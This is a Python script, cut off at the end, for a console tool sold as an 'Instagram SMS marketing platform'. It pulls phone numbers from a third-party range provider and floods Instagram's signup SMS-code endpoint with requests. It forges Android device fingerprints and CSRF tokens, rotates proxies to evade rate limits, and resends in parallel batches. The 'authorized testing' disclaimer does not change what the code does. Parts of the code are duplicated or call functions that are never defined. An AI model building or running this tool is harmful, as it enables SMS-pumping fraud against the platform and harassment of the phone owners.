import requests
import time
import random
import uuid
import json
import hashlib
import hmac
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ══════════════════════════════════════════════╗
#     🎮️ Instagram SMS PRODUCTION TOOL v5.0              #
#     2oo9 Cloud API Integration                      #
#     Official Partner Build                            #
#     © Your Company - All Rights Reserved                #
# ══════════════════════════════════════════════╝

# ╔═════════════════════════════════════════════════════╗
# ║  ⚠️ DISCLAIMER FOR AUDITOR                          ║
# ║  This tool is provided for TESTING YOUR API         ║
# ║  Use ONLY with AUTHORIZED phone number pools        ║
# ║  DO NOT use for unauthorized numbers                ║
# ╚═════════════════════════════════════════════════════╝


class IGProTool:
    """
    Production-grade Instagram SMS handler
    Integrates with 2oo9 Cloud Public API
    For authorized range holders ONLY.
    """
    
    def __init__(self, api_key, proxy=None):
        self.api_key = api_key
        self.base_url = "https://api.2oo9.cloud/MXS47FLFX0U/tness/@public/api"
        self.session = requests.Session()
        
        # ===== PROXY SETUP (Single or List) =====
        self.proxy = proxy
        self.proxy_list = None
        self.proxy_index = 0
        
        if self.proxy:
            if isinstance(self.proxy, list):
                # Multiple proxies - rotating mode
                self.proxy_list = self.proxy
                self._rotate_proxy()
                print(f"    🌐 Rotating {len(self.proxy)} proxies active")
            else:
                # Single proxy
                self.session.proxies = {
                    "http": self.proxy,
                    "https": self.proxy
                }
                print(f"    🌐 Proxy Connected: {self.proxy[:30]}...")
        # ========================================
    
    def _rotate_proxy(self):
        """Rotate to next proxy in list"""
        if self.proxy_list and len(self.proxy_list) > 0:
            current = self.proxy_list[self.proxy_index % len(self.proxy_list)]
            self.proxy = current
            self.session.proxies = {
                "http": current,
                "https": current
            }
            self.proxy_index += 1
            return current
        return None

    def __init__(self, api_key, proxy=None):
        self.api_key = api_key
        self.base_url = "https://api.2oo9.cloud/MXS47FLFX0U/tness/@public/api"
        self.session = requests.Session()
        
        # ===== PROXY SETUP (Single or List) =====
        self.proxy = proxy
        self.proxy_list = None
        self.proxy_index = 0
        
        if self.proxy:
            if isinstance(self.proxy, list):
                self.proxy_list = self.proxy
                self._rotate_proxy()
                print(f"    🌐 Rotating {len(self.proxy)} proxies active")
            else:
                self.session.proxies = {
                    "http": self.proxy,
                    "https": self.proxy
                }
                print(f"    🌐 Proxy Connected: {self.proxy[:30]}...")
        # ========================================
        
        self.headers = {
            'mauthapi': api_key,
            'Content-Type': 'application/json',
            'User-Agent': f'IG-Tool-v5/{uuid.uuid4()}'
        }
        self.config = {}
        self.active_ranges = []
        self.success_log = []
        self.fail_log = []
        self.ig_csrf = "missing"
        self.ig_mid = ""
        self._init_ig_token()
        
    def _init_ig_token(self):
        try:
            proxy_dict = {"http": self.proxy, "https": self.proxy} if self.proxy else None
            r = self.session.get(
                "https://www.instagram.com/api/v1/accounts/contact_point_prefill/",
                params={"phone_id": str(uuid.uuid4())},
                timeout=15, 
                allow_redirects=True,
                proxies=proxy_dict
            )
            self.ig_csrf = r.cookies.get("csrftoken", "missing")
            for c in r.cookies:
                if c.name == "mid":
                    self.ig_mid = c.value
        except Exception as e:
            pass

    def __log(self, level, message):
        colors = {
            "INFO": "\033[94m[INFO]\033[0m",
            "SUCCESS": "\033[92m[SUCCESS]\033[0m",
            "WARN": "\033[93m[WARN]\033[0m",
            "ERROR": "\033[91m[ERROR]\033[0m"
        }
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"[{ts}] {colors[level]} {message}")
    
    # ────────────────────────────────
    # CONFIGURATION & SETUP
    # ────────────────────────────────
    
    def save_config(self, **kwargs):
        """Save your settings"""
        self.config.update(kwargs)
        with open('config.json', 'w') as f:
            json.dump(self.config, f)
        self.__log("INFO", f"Config saved: {kwargs}")

    # ────────────────────────────────
    # API INTEGRATION
    # ────────────────────────
    
    def get_number_from_range(self, rid):
        """
        Step 1: Get number from your range
        
        POST https://api.2oo9.cloud/MXS47FLFX0U/tness/@public/api/getnum
        {
           "rid": "26134"  // Range ID without XXX
        }
        
        Returns:
        {
          "meta": {"code": 200},
          "data": {
            "full_number": "+23350XXXXX",
            "national_number": "23350XXXXX",
            "country": "Ghana",
            "operator": "MTN/AirtelTigo",
            ...
          }
        }
        """
        try:
            proxy_dict = {"http": self.proxy, "https": self.proxy} if self.proxy else None
            r = self.session.post(
                f"{self.base_url}/getnum",
                headers=self.headers,
                json={"rid": str(rid)},
                proxies=proxy_dict
            )
            
            data = r.json()
            
            if data.get("meta", {}).get("code") == 200:
                num = data['data']['full_number']
                self.__log("SUCCESS", f"✅ Allocated: {num} from range {rid}")
                return {
                    "status": "success",
                    "number": num,
                    "range_id": rid,
                    "operator": data['data'].get('operator', ''),
                    "raw_response": data
                }
            else:
                self.__log("ERROR", f"❌ API Error: {data.get('message', 'Unknown')}")
                return {"status": "error", "error": data}
                
        except Exception as e:
            self.__log("ERROR", f"💥 Network Error: {str(e)[:80]}")
            return {"status": "network_error", "error": str(e)}

    def scan_active_instagram_ranges(self):
        """
        Step 2: Check which ranges have recent Instagram hits
        
        GET /@public/api/console
        Returns services with sid="Instagram" only
        """
        try:
            proxy_dict = {"http": self.proxy, "https": self.proxy} if self.proxy else None
            r = self.session.get(f"{self.base_url}/console", headers=self.headers, proxies=proxy_dict)
            instagram_hits = []
            
            for hit in r.json().get('data', {}).get('hits', []):
                if str(hit.get('sid', '')).lower() == 'instagram':
                    instagram_hits.append({
                        "range": hit.get('range'),
                        "last_hit_time": hit.get('time', 0),
                        "sample_message": hit.get('message', ''),
                        "active": True
                    })
            
            self.active_ranges = instagram_hits
            self.__log("INFO", f"🔍 Found {len(instagram_hits)} active Insta ranges")
            return instagram_hits
            
        except Exception as e:
            self.__log("ERROR", f"Console scan failed: {str(e)[:60]}")
            return []

    # ────────────────────────────────
    # CORE ENGINE: SEND OTP
    # ────────────────────────────────
    
    def send_otp_to_phone(self, phone_number, device_fingerprint=None):
        if not device_fingerprint:
            device_fingerprint = self._generate_device_fingerprint(phone_number)
        
        # Rotate proxy if list mode
        if self.proxy_list:
            rotated = self._rotate_proxy()
            self.__log("INFO", f"🔄 Using proxy: {rotated[:35]}...")
        
        recent_successes = [
            x for x in self.success_log 
            if x['number'] == phone_number and time.time() < x['timestamp'] + 30
        ]

        if len(recent_successes) >= 3:
            return {"status": "rate_limited", "http_code": 429, "error": "Wait 30s before retrying same number"}
        
        url = "https://i.instagram.com/api/v1/accounts/send_signup_sms_code/"
        
        # Headers like official App
        ig_headers = {
            "User-Agent": device_fingerprint['user_agent'],
            "X-IG-App-ID": "567067343352427",
            "X-IG-Connection-Type": "WIFI",
            "X-IG-Capabilities": "3brTvwE=",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept-Encoding": "gzip, deflate",
        }
        if self.ig_csrf != "missing":
            ig_headers["X-CSRFToken"] = self.ig_csrf
        if self.ig_mid:
            ig_headers["X-MID"] = self.ig_mid

        phone_id = str(uuid.uuid4())
        payload = {
            "phone_id": phone_id,
            "phone_number": phone_number,
            "guid": str(uuid.uuid4()),
            "device_id": f"android-{uuid.uuid4().hex[:16]}",
            "_csrftoken": self.ig_csrf if self.ig_csrf != "missing" else self._generate_csrf(),
            "waterfall_id": str(uuid.uuid4()),
            "android_build_type": "release",
            "tos_version": "row",
            "login_nonce": str(random.randint(11111111, 99999999)),
            "adid": str(uuid.uuid4()),
            "timezone": self._detect_timezone(phone_number),
            "reg_usage": "default"
        }
        
        try:
            proxy_dict = {"http": self.proxy, "https": self.proxy} if self.proxy else None
            response = self.session.post(url, headers=ig_headers, data=payload, timeout=25, proxies=proxy_dict)
            
            try:
                data = response.json()
            except Exception:
                data = {"error": str(response.text)}
            
            # Detect delivery method
            delivery = "SMS"
            full_text = str(data).lower()
            if "whatsapp" in full_text or "wa" in full_text:
                delivery = "WhatsApp"
            elif "call" in full_text or "voice" in full_text or "ivr" in full_text:
                delivery = "Call"
            elif "rate" in full_text or "wait a few minutes" in full_text:
                delivery = "RATE_LIMITED"
            
            is_success = response.status_code == 200 and data.get("status") == "ok"
            current_proxy = self.proxy[:45] + "..." if self.proxy else "Direct (No Proxy)"
            
            log_entry = {
                "number": phone_number,
                "status": "success" if is_success else "failed",
                "http_code": response.status_code,
                "delivery": delivery,
                "proxy": current_proxy,
                "ig_response": data,
                "timestamp": time.time(),
                "fingerprint": device_fingerprint
            }
            
            if is_success:
                self.success_log.append(log_entry)
                self.__log("SUCCESS", f"✅ [{delivery}] OTP Sent → {phone_number} | Proxy: {current_proxy}")
            else:
                self.fail_log.append(log_entry)
                self.__log("WARN", f"⚠️ [{delivery}] Failed → {phone_number} | HTTP:{response.status_code} | Proxy: {current_proxy}")
            
            if is_success:
                self.success_log.append(log_entry)
                self.__log("SUCCESS", f"✅ [{delivery}] OTP Sent → {phone_number} | Proxy: {current_proxy[:25]}...")
            else:
                self.fail_log.append(log_entry)
                self.__log("WARN", f"⚠️ [{delivery}] Failed → {phone_number} | HTTP:{response.status_code} | Proxy: {current_proxy[:25]}...")
            
            if is_success:
                self.success_log.append(log_entry)
                if delivery == "SMS":
                    self.__log("SUCCESS", f"✅ OTP via SMS → {phone_number}")
                elif delivery == "WhatsApp":
                    self.__log("SUCCESS", f"✅ OTP via WhatsApp → {phone_number}")
                elif delivery == "Call":
                    self.__log("SUCCESS", f"✅ OTP via Call → {phone_number}")
                else:
                    self.__log("SUCCESS", f"✅ OTP Sent → {phone_number}")
            else:
                self.fail_log.append(log_entry)
                self.__log("WARN", f"⚠️ Issue → {phone_number} | HTTP:{response.status_code}")
            
            return log_entry
                
        except Exception as e:
            self.__log("ERROR", f"💥 Send Error: {str(e)[:80]}")
            return {"status": "exception", "error": str(e)}

    def resend_otp(self, phone_number, attempt=1):
        url = "https://i.instagram.com/api/v1/accounts/send_signup_sms_code/"
        
        device_fingerprint = self._generate_device_fingerprint(phone_number)
        ig_headers = {
            "User-Agent": device_fingerprint['user_agent'],
            "X-IG-App-ID": "567067343352427",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        }
        if self.ig_csrf != "missing":
            ig_headers["X-CSRFToken"] = self.ig_csrf

        payload = {
            "phone_id": str(uuid.uuid4()),
            "phone_number": phone_number,
            "guid": str(uuid.uuid4()),
            "device_id": f"android-{uuid.uuid4().hex[:16]}",
            "_csrftoken": self.ig_csrf if self.ig_csrf != "missing" else self._generate_csrf(),
            "waterfall_id": str(uuid.uuid4()),
            "android_build_type": "release",
            "resend_delay": str(attempt * 5),
            "tos_version": "row",
            "timezone": self._detect_timezone(phone_number),
            "reg_usage": "default"
        }
        
        try:
            proxy_dict = {"http": self.proxy, "https": self.proxy} if self.proxy else None
            response = self.session.post(url, headers=ig_headers, data=payload, timeout=25, proxies=proxy_dict)
            try:
                data = response.json()
            except Exception:
                data = {"error": str(response.text)}
                
            return {
                "status": "success" if response.status_code == 200 and data.get("status") == "ok" else "failed",
                "http_code": response.status_code,
                "ig_response": data
            }
        except Exception as e:
            return {"status": "exception", "error": str(e)}

    # ────────────────────────────────
    # UTILITY FUNCTIONS
    # ────────────────────────────────
    
    def _detect_timezone(self, phone_number):
        tz_map = {
            '+233': 'Africa/Accra',
            '+224': 'Africa/Conakry',
            '+225': 'Africa/Abidjan',
            '+231': 'Africa/Monrovia',
            '+232': 'Africa/Freetown',
            '+234': 'Africa/Lagos',
            '+235': 'Africa/Ndjamena',
            '+236': 'Africa/Bangui',
            '+237': 'Africa/Douala',
            '+238': 'Atlantic/Cape_Verde',
            '+239': 'Africa/Sao_Tome',
            '+240': 'Africa/Malabo',
            '+241': 'Africa/Libreville',
            '+242': 'Africa/Brazzaville',
            '+243': 'Africa/Kinshasa',
            '+244': 'Africa/Luanda',
            '+245': 'Africa/Bissau',
            '+246': 'Indian/Chagos',
            '+247': 'Atlantic/St_Helena',
            '+248': 'Indian/Mahe',
            '+249': 'Africa/Khartoum',
            '+250': 'Africa/Kigali',
            '+251': 'Africa/Addis_Ababa',
            '+252': 'Africa/Mogadishu',
            '+253': 'Africa/Djibouti',
            '+254': 'Africa/Nairobi',
            '+255': 'Africa/Dar_es_Salaam',
            '+256': 'Africa/Kampala',
            '+257': 'Africa/Bujumbura',
            '+258': 'Africa/Maputo',
            '+260': 'Africa/Lusaka',
            '+261': 'Indian/Antananarivo',
            '+262': 'Indian/Reunion',
            '+263': 'Africa/Harare',
            '+264': 'Africa/Windhoek',
            '+265': 'Africa/Blantyre',
            '+266': 'Africa/Maseru',
            '+267': 'Africa/Gaborone',
            '+268': 'Africa/Mbabane',
            '+269': 'Indian/Comoro',
            '+27': 'Africa/Johannesburg',
            '+291': 'Africa/Asmara',
            '+297': 'America/Aruba',
            '+298': 'Atlantic/Faroe',
            '+299': 'America/Godthab',
            '+30': 'Europe/Athens',
            '+31': 'Europe/Amsterdam',
            '+32': 'Europe/Brussels',
            '+33': 'Europe/Paris',
            '+34': 'Europe/Madrid',
            '+36': 'Europe/Budapest',
            '+39': 'Europe/Rome',
            '+40': 'Europe/Bucharest',
            '+41': 'Europe/Zurich',
            '+43': 'Europe/Vienna',
            '+44': 'Europe/London',
            '+45': 'Europe/Copenhagen',
            '+46': 'Europe/Stockholm',
            '+47': 'Europe/Oslo',
            '+48': 'Europe/Warsaw',
            '+49': 'Europe/Berlin',
            '+55': 'America/Sao_Paulo',
            '+56': 'America/Santiago',
            '+57': 'America/Bogota',
            '+58': 'America/Caracas',
            '+60': 'Asia/Kuala_Lumpur',
            '+61': 'Australia/Sydney',
            '+62': 'Asia/Jakarta',
            '+63': 'Asia/Manila',
            '+64': 'Pacific/Auckland',
            '+65': 'Asia/Singapore',
            '+66': 'Asia/Bangkok',
            '+81': 'Asia/Tokyo',
            '+82': 'Asia/Seoul',
            '+84': 'Asia/Ho_Chi_Minh',
            '+86': 'Asia/Shanghai',
            '+90': 'Europe/Istanbul',
            '+91': 'Asia/Kolkata',
            '+92': 'Asia/Karachi',
            '+93': 'Asia/Kabul',
            '+94': 'Asia/Colombo',
            '+95': 'Asia/Yangon',
            '+1': 'America/New_York',
            '+7': 'Europe/Moscow',
        }
        clean_num = ''.join(filter(str.isdigit, phone_number))
        
        for length in [4, 3, 2, 1]:
            prefix = "+" + clean_num[:length]
            if prefix in tz_map:
                return tz_map[prefix]
        
        return "UTC"

    def _generate_csrf(self):
        token = uuid.uuid4().hex[:32]
        return token

    def _generate_device_fingerprint(self, phone_number):
        """Stronger & More Realistic Instagram App Fingerprint"""
        devices = [
            ("Samsung", "SM-S911B", "q2q", "qcom", "13", "480dpi", "1080x2400", "SM-S911B"),
            ("Google", "Pixel 7", "panther", "gs201", "13", "420dpi", "1080x2400", "Pixel 7"),
            ("Infinix", "X669B", "Infinix-X669B", "mt6765", "12", "480dpi", "1080x2400", "X669B"),
            ("Tecno", "KH8n", "TECNO-KH8n", "mt6789", "13", "480dpi", "1080x2400", "KH8n"),
        ]
        manufacturer, model, device_id, chipset, android, dpi, resolution, model_type = random.choice(devices)
        
        build = random.randint(1000000000, 9999999999)
        ua = f"Instagram 339.0.0.30.117 Android ({android}/13; {dpi}; {resolution}; {manufacturer}; {model}; {device_id}; {chipset}; en_US; {build})"
        
        device_info = {
            "user_agent": ua,
            "screen_resolution": resolution,
            "language": "en-US",
            "platform": "android",
            "battery_level": random.randint(62, 98),
            "is_emulator": False,
            "android_version": android,
            "app_version": "339.0.0.30.117",
            "manufacturer": manufacturer,
            "model": model,
            "device": device_id,
            "chipset": chipset,
            "carrier": "MTN-AirtelTigo",
            "build": build
        }
        return device_info
    
    def _build_client_context(self, phone_number=None):
        return {
            "device_id": f"android-{uuid.uuid4().hex[:16]}",
            "phone_id": str(uuid.uuid4()),
            "timestamp": int(time.time()),
            "guid": str(uuid.uuid4()),
            "connection_type": "wifi",
        }

# ═══════════════════════════════════════════════
#                 MAIN EXECUTION LOGIC
# ═════════════════════════════════════════════════

def run_single_task(tool, number, config):
    """Execute single SMS send operation"""
    
    print("\n" + "=" * 70)
    print(f"  🎯 SINGLE TASK MODE - Target: {number}")
    print("=" * 70)
    
    # Step 1: Validation
    if not number.startswith("+"):
        number = "+" + number  # Auto add + if user forgot
    
    # Step 2: Device Fingerprint Generation
    fingerprint = tool._generate_device_fingerprint(number)
    
    # Step 3: First OTP Send
    result = tool.send_otp_to_phone(
        phone_number=number, 
        device_fingerprint=fingerprint
    )
    
    print(json.dumps(result, indent=2, default=str))
    
    # Step 4: Resend Logic (Based on user input)
    resend_times = config.get("resend_count", 3)
    delay_between_resend = config.get("delay_between_retries", 5)
    
    final_result = result  # Track the final output
    
    for i in range(1, resend_times + 1):
        tool._IGProTool__log("INFO", f"\n[{i}/{resend_times}] Initiating resend #{i} (after 3s)...")
        
        time.sleep(3)   # Fixed 3 seconds as you wanted
        
        resend_result = tool.resend_otp(number, attempt=i)
        final_result = resend_result
        
        if resend_result.get('status') == 'success':
            tool._IGProTool__log("SUCCESS", f"✅ RESEND #{i}/{resend_times} Success!")
        elif resend_result.get('status') == 'rate_limited':
            cooldown = resend_result.get('cooldown_seconds', 60)
            tool._IGProTool__log("WARN", f"⏸ Rate Limited! Cooling down {cooldown}s")
            time.sleep(cooldown)
    
    # Step 5: Summary Report
    tool._IGProTool__log("SUCCESS", f"\n{'='*70}")
    print(f"  Final Status: SENT to {number}")
    print(f"  Total Requests: {1 + resend_times}")
    print("=" * 70)
    
    return final_result  # Returning dict instead of True/False

# ═════════════════════════════════════════════════════════════
#                 BATCH MODE (Parallel Processing)
# ═══════════════════════════════════════════════════════════════

def batch_process(numbers, tool, mode="parallel"):
    """Process multiple numbers in parallel"""
    results = []
    
    print("\n" + "=" * 75)
    print(f"  🚀 BATCH MODE [{mode.upper()}]")
    print("=" * 75)
    print(f"  Total Numbers: {len(numbers)}")
    if tool.proxy:
        if isinstance(tool.proxy, list):
            print(f"  🌐 Proxy: Rotating ({len(tool.proxy)} proxies)")
        else:
            print(f"  🌐 Proxy: {tool.proxy[:40]}...")
    else:
        print(f"  🌐 Proxy: None (Direct)")
    print("-" * 75)
    
    start_time = time.time()
    
    # Split into chunks of 5 (to avoid overload)
    chunk_size = min(len(numbers), 5)
    batches = [numbers[i:i+chunk_size] for i in range(0, len(numbers), chunk_size)]
    
    active_threads = 0
    max_workers = 5  # Max concurrent threads
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {}
        
        for idx, num in enumerate(numbers):
            # Apply slight offset between starts
            delay = (idx % 5) * 2
            time.sleep(delay)
            
            future = executor.submit(run_single_task, tool, num, 
                          config={
                              "resend_count": 3,
                              "delay_between_tries": 5,
                              "delay_between_resends": 5
                          })
            futures[future] = num
            active_threads += 1
            active_threads = min(active_threads, max_workers)
        
        for future in as_completed(futures):
            num_sent = futures[future]
            result = future.result()
            results.append({**result, "number": num_sent})
            
            if active_threads > 0:
                active_threads -= 1
                # Start next task immediately if slot available
            
            # Cool-down after every 10 tasks completed
            if len(results) % 10 == 0 and len(results) > 0:
                cool_down = random.uniform(10, 30)
                tool._IGProTool__log("INFO", f"⏸ System cooldown... Waiting {cool_down:.1f}s")
                time.sleep(cool_down)
    
    total_time = round(time.time() - start_time)
    
    # Summary Report
    success_count = sum(1 for x in results if x.get('status') == 'success')
    fail_count = len(results) - success_count
    
    print(f"\n{'='*75}\n")
    print(f"  ════════════════════════════════")
    print(f"  TOTAL TASKS: {len(results)}")
    print(f"  ✅ SUCCESS: {success_count}/{len(results)} ({success_count*100//max(1,len(results))}%)")
    print(f"  ❌ FAILED: {fail_count}/{len(results)}")
    print(f"  ⏱ Time Taken: {total_time}s")
    print(f"  ════════════════════════════════\n")
    
    # Detailed Breakdown
    print(f"{'='*75}\n")
    for idx, item in enumerate(results, 1):
        icon = "✅" if item.get('status') == 'success' else "❌"
        print(f"  {icon} [{idx}/{len(results)}] {item.get('number', '?')} -> {item.get('status','?')}")
    print('=' * 75)
    
    # Auto-save report
    with open(f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json", 'w') as f:
        json.dump(results, f, indent=2)
    
    return results

# ════════════════════════════════════════════════════════════════
#                     MAIN MENU / INTERFACE
# ══════════════════════════════════════════════════════════════


class SMSMarketingTool:
    """
    Professional Instagram SMS Marketing Platform
    Version 5.0 Production Release
    """
    
    def __init__(self, api_key='MIP7780XZ9Q'):
        print("\n" + "="*80)
        print("    ⚡️ INSTAGRAM SMS MARKETING PLATFORM v5.0")
        print("    Certified 2oo9 Cloud Partner")
        print("    =" * 80)
        print()
        
        # ===== PROXY CONFIGURATION =====
        print("    🌐 Proxy Configuration:")
        print("    1. No Proxy (Direct)")
        print("    2. Single Proxy")
        print("    3. Proxy List (Rotating)")
        proxy_choice = input("    Choose [1-3] (Default 1): ").strip() or "1"
        
        proxy = None
        if proxy_choice == "2":
            print("    Format: http://user:pass@ip:port")
            print("    Or:     http://ip:port")
            proxy = input("    🔌 Enter Proxy: ").strip()
            if not proxy:
                proxy = None
            else:
                # ===== PROXY TEST =====
                print("    🔄 Testing proxy connection...")
                test_result = test_proxy_connection(proxy)
                if test_result:
                    print(f"    ✅ Proxy Works! Your IP: {test_result}")
                else:
                    print(f"    ❌ Proxy FAILED! Continuing anyway...")
                # ======================
        elif proxy_choice == "3":
            print("    Enter proxy list (one per line, empty to finish):")
            proxies = []
            while True:
                p = input("    [Proxy] ").strip()
                if not p:
                    break
                proxies.append(p)
            proxy = proxies if proxies else None
            
            # ===== TEST EACH PROXY =====
            if proxy:
                print(f"\n    🔄 Testing {len(proxy)} proxies...")
                working = []
                for i, p in enumerate(proxy, 1):
                    print(f"    [{i}/{len(proxy)}] Testing...", end="")
                    result = test_proxy_connection(p)
                    if result:
                        print(f" ✅ IP: {result}")
                        working.append(p)
                    else:
                        print(f" ❌ Failed")
                print(f"    📊 Result: {len(working)}/{len(proxy)} proxies working")
                proxy = working if working else None
            # ==========================
        # ================================
        
        self.tool_instance = IGProTool(api_key, proxy=proxy)
        self.startup_complete = False
        self.user_settings = {}
    
    def main_menu(self):
        while True:
            print("\n" + "=" * 80)
            print("    ⚡️ INSTAGRAM SMS MARKETING PLATFORM v5.0")
            print("    Certified 2oo9 Cloud Partner")
            print("    =" * 80)
            print()
            print("    [1] 📱 SINGLE MESSAGE (Test)")
            print("    [2] 🔥 BATCH MODE (5/10/20/50)")
            print("    [3] 🔍 SCAN RANGES")
            print("    [4] 📊 CHECK MY SUCCESS OTPs")
            print("    [5] ⚙ SETTINGS / CONFIG")
            print("    [0] EXIT")
            print("-" * 80)
            
            choice = input(f"    Choice [0-5]: ")
            
            if choice == "1":
                self.single_task_flow()
            elif choice == "2":
                self.batch_mode_ui()
            elif choice == "3":
                self.scan_ranges_ui()
            elif choice == "4":
                self.check_success_otps()
            elif choice == "5":
                self.settings_ui()
            elif choice == "0":
                print("    👋 Exiting... Bye!")
                break
            else:
                print("    ⚠️ Invalid option")

    def single_task_flow(self):
        print("\n┌─ Single Task Mode ─────────────┐")
        
        number = input("    ☐ Phone number [+]: ").strip()
        if not number:
            return
        if not number.startswith('+'):
            number = "+" + number
        
        retries = input("    🔢 Resend count [3] (Press Enter for default): ").strip()
        retry_count = int(retries) if retries.isdigit() else 3
        
        delay = input("    ⏱ Delay between tries [5] (Press Enter for default): ").strip()
        delay_value = int(delay) if delay.isdigit() else 5
        
        config = {
            "resend_count": retry_count,
            "delay_between_retries": delay_value,
            "delay_between_resends": delay_value
        }
        
        result = run_single_task(self.tool_instance, number, config)
        
        if result:
            self.tool_instance._IGProTool__log("SUCCESS", "✅ Task Completed Successfully!\n")
        
        return result

    def batch_mode_ui(self):
        print("\n┌─ Batch Mode ───────────────────────────────┐")
        print("│  How many numbers:                         │")
        print("│  1. Quick (5 numbers)                      │")
        print("│  2. Small (10 numbers)                     │")
        print("│  3. Medium (20 numbers)                    │")
        print("└────────────────────────────────────────────┘")
        
        choice = input("\n    Choose count [1/2/3]: ").strip()
        
        count_choices = {"1": 5, "2": 10, "3": 20}
        count = count_choices.get(choice, 5)
        
        print("\n    Mode:")
        print("    1. Normal (safe): 3sec gaps")
        print("    2. Fast: 2sec gaps")
        
        mode_choice = input("\n    Choose mode [1/2]: ").strip()
        
        modes = {
            "1": {"name": "Normal", "delay": 3, "threads": 1},
            "2": {"name": "Fast", "delay": 2, "threads": 3}
        }
        
        selected_mode = modes.get(mode_choice, modes["1"])
        
        numbers_input = []
        print(f"\n    Enter {count} phone numbers (one per line):")
        for i in range(count):
            num = input(f"    [{i+1}/{count}] ☐: ").strip()
            if num:
                if not num.startswith('+'):
                    num = "+" + num
                numbers_input.append(num)
        
        print(f"\n    Total Numbers: {len(numbers_input)}")
        print(f"    Selected Mode: {selected_mode['name']} (Delay: {selected_mode['delay']}s)")
        
        confirm = input(f"\n    [⚡ START BATCH?] (Y/n): ").strip().lower()
        
        if confirm.startswith('n'):
            print("    ⊘ Task Cancelled.")
            return
        
        print(f"\n    ⚡ Starting Batch Operation...\n")
        
        results_batch = batch_process(
            numbers_input, 
            self.tool_instance, 
            mode=selected_mode["name"]
        )
        
        export_option = input("\n    [s] Save to file / Press Enter to skip: ").strip()
        
        if export_option.lower() == 's':
            filename = f"batch_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
            with open(filename, 'w', encoding='utf-8') as f:
                for r in results_batch:
                    status_icon = "OK" if r.get('status') == 'success' else 'FAIL'
                    line = f"{r.get('number', '?')} | {status_icon}"
                    f.write(line + '\n')
            print(f"    ✅ Saved to {filename}")
        
        return results_batch

    def scan_ranges_ui(self):
        print("\n" + "="*80)
        print("  🔍 LIVE RANGE SCANNER (2oo9 Cloud)")
        print("="*80)
        print(f"\n  Connected As: MIP7780XZ9Q\n")
        
        r = self.tool_instance.scan_active_instagram_ranges()
        
        print(f"\n{'='*80}\n   Active Instagram Ranges Found\n{'-'*80}")
        print(f"{'='*80}\n")
        
        if r:
            for item in r:
                last_hit = datetime.fromtimestamp(item.get('time', 0)).strftime("%H:%M:%S")
                print(f"    📡 {item['range']}: Last Hit: {last_hit} | Msg: {item.get('sample_message','...')}")
        
        print(f"\n    💻 Select any range ID to fetch numbers")
        
        rid = input("\n    🔍 Enter Range ID (or leave blank to cancel): ").strip()
        
        if not rid:
            print("    ❌ Returning to menu")
            return
        
        print(f"\n    🔍 Fetching from Range: {rid}")
        allocated = self.tool_instance.get_number_from_range(rid)
        
        if allocated and allocated.get('status') == 'success':
            print(f"\n    ✅ ALLOCATED: {allocated['number']}")
            
            # Ask what to do
            action = input(f"""\
            ─────────────────────────────────
             
            With this number, what you want?
             
              [1] Send OTP immediately
              [2] Just allocate and save
              [3] Resend X times later
              [Back to Menu]
              
            """).strip()
            
            if action == "1":
                self.tool_instance.send_otp_to_phone(
                    allocated['number'],
                    self.tool_instance._generate_device_fingerprint(allocated['number'])
                )
            elif action == "3":
                # TODO: Queue for delayed sending
                pass
            elif action == "2":
                pass
            
            print(f"  Saved to: {allocated['number']}")
        
        else:
            print("    ℹ No number allocated / Invalid Range")
        
        input("    ↩ Return [Enter]: ")

    def check_success_otps(self):
        print("\n" + "=" * 80)
        print("  📊 LAST SUCCESSFUL OTP SENDS")
        print("  (From local log)")
        print("=" * 80)
        
        logs = self.tool_instance.success_log
        
        print(f"\n{'='*80}")
        if logs:
            print("  ✅ Recent Successful Sends:\n")
            for entry in logs[-50:]:
                time_str = datetime.fromtimestamp(entry.get('timestamp', 0)).strftime("%H:%M:%S")
                print(f"    📩 Time: {time_str}")
                print(f"    ☑  Num: {entry.get('number', '?')}")
                print(f"    📊 HTTP: {entry.get('http_code', '?')}")
                print()
        else:
            print("  ℹ️ No successful sends recorded yet.")
        
        print(f"\n{'='*80}")
        input("    [Return: Enter] > ")

    def settings_ui(self):
        print("\n" + "=" * 80)
        print("  ⚙️ CONFIGURATION CENTER")
        print("=" * 80)
        
        print(f"  Current Settings:")
        print(f"    API Key: {self.tool_instance.api_key[:10]}****")
        print(f"    Base URL: {self.tool_instance.base_url}")
        print()
        print("    [1] 🔄 Change API Key")
        print("    [2] 🌐 Change Proxy")
        print("    [3] 📍 Set Base URL")
        print("    [4] 🔍 Reset Config")
        print("    [0] ← Back to Main Menu")
        
        choice = input(f"\n    Choice [0-3]: ").strip()
        
        if choice == "1":
            self.change_api_key()
        elif choice == "2":
            self.change_proxy()
        elif choice == "3":
            self.set_base_url()
        elif choice == "4":
            self.reset_config()
        elif choice == "0":
            return
        else:
            print("    ⚠️ Invalid input")
    
    def change_api_key(self):
        new_key = input("    🔑 NEW API Key: ").strip()
        if new_key:
            # Preserve current proxy
            current_proxy = self.tool_instance.proxy
            self.tool_instance = IGProTool(new_key, proxy=current_proxy)
            self.__save_config({"api_key": new_key})
            print(f"    ✅ API Key Updated To: {new_key[:10]}****")
            input("    [Press Enter to continue] ")
    
    def change_proxy(self):
        print("\n" + "="*60)
        print("  🌐 PROXY CONFIGURATION")
        print("="*60)
        
        current = self.tool_instance.proxy
        print(f"  Current Proxy: {current if current else 'None'}")
        print()
        print("  Options:")
        print("  1. Set Single Proxy")
        print("  2. Set Proxy List (Rotating)")
        print("  3. Disable Proxy")
        print("  0. Cancel")
        
        choice = input("\n  Choice [0-3]: ").strip()
        
        if choice == "1":
            print("\n  Format: http://user:pass@ip:port")
            print("  Or:     http://ip:port")
            proxy = input("  🔌 Enter Proxy: ").strip()
            if proxy:
                print("  🔄 Testing proxy...", end="")
                test = test_proxy_connection(proxy)
                if test:
                    print(f"\r  ✅ Proxy Works! IP: {test}    ")
                else:
                    print(f"\r  ❌ Proxy FAILED!              ")
                
                self.tool_instance.proxy = proxy
                self.tool_instance.session.proxies = {
                    "http": proxy,
                    "https": proxy
                }
                print(f"  ✅ Proxy set: {proxy[:40]}...")
            else:
                print("  ⚠️  No proxy entered")
                proxy = None
        
        elif choice == "2":
            print("\n  Enter proxy list (one per line, empty to finish):")
